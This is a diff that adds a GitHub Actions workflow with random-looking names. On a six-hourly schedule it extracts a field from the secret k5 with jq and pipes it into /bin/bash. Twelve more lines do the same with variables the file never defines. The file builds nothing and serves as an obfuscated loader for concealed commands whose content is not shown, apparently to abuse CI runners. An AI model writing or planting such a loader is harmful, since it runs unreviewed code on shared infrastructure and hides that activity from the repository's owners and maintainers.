@@ -1,0 +1,31 @@
+name: ellasession7069
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ellasession7069
+        env:
+          k5: ${{ secrets.k5 }}
+        run: |
+          echo $k5 | jq -r .o131 | /bin/bash
+          echo $cmmyr98 | jq -r .vkna61255 | /bin/bash
+          echo $rliy0070 | jq -r .h976 | /bin/bash
+          echo $gd4 | jq -r .zxgha210 | /bin/bash
+          echo $iy718 | jq -r .v861 | /bin/bash
+          echo $hylw9894 | jq -r .xtbla887 | /bin/bash
+          echo $xbka3055 | jq -r .nsyws462 | /bin/bash
+          echo $r96 | jq -r .r22 | /bin/bash
+          echo $gkhd48324 | jq -r .shgud49 | /bin/bash
+          echo $jpge94066 | jq -r .u22 | /bin/bash
+          echo $wnx31580 | jq -r .tjx5978 | /bin/bash
+          echo $lrs4 | jq -r .cxw1 | /bin/bash
+          echo $pttq94 | jq -r .adxvp5304 | /bin/bash
+
